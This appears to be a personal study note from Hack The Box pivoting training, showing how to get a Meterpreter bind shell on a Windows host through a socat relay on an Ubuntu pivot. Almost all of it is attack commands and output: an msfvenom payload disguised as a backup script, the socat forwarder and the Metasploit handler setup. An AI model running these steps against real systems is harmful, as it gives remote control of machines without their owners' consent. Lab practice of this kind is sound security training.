---
title: Socat Bind Shell
draft: false
tags:
  - socat
---
Attacker  -> Ubuntu -> Windows

Windows server will start a listener and bind to a particular port. 

Attacker creates a bind shell payload for windows and execute it on the Windows host.

Socat redirector on Ubuntu will pass the bind connection coming from the metasploit to windows host.

## Create Windows Payload

```shell-session
jadu101@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Final size of exe file: 7168 bytes
Saved as: backupjob.exe
```


## Start Socat Bind Shell Listener

We will start socat bind shell listener on PivotHost:

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```


## Start mult-handler

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```